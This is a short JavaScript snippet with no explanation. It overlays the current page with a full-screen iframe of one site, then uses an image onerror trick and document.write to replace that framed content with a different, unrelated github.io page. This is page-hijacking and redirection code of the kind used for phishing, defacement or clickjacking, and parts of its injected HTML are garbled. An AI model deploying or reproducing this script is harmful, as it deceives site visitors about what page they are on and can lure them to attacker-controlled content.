(function() {
    var f = document.createElement('iframe');
    f.src = 'https://site.nhd.org';
    f.style.width = '100%';
    f.style.height = '100%';
    f.style.border = 'none';
    f.style.position = 'fixed';
    f.style.top = '0';
    f.style.left = '0';
    f.style.zIndex = '9999';
    document.body.appendChild(f);
    f.onload = function() {
        try {
            var d = f.contentDocument || f.contentWindow.document;
            if (!d._redirectInjected) {
                d._redirectInjected = true;
                var i = d.createElement('img');
                i.src = 'x';
                i.onerror = function() {
                    d.open();
                    d.write('<iframe src=&quot;https://efficenspoun.github.io/miniature-doodle/; style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;border:none;&quot;></iframe>');
                    d.close();
                };
                d.body.appendChild(i);
            }
        } catch (e) {}
    };
})()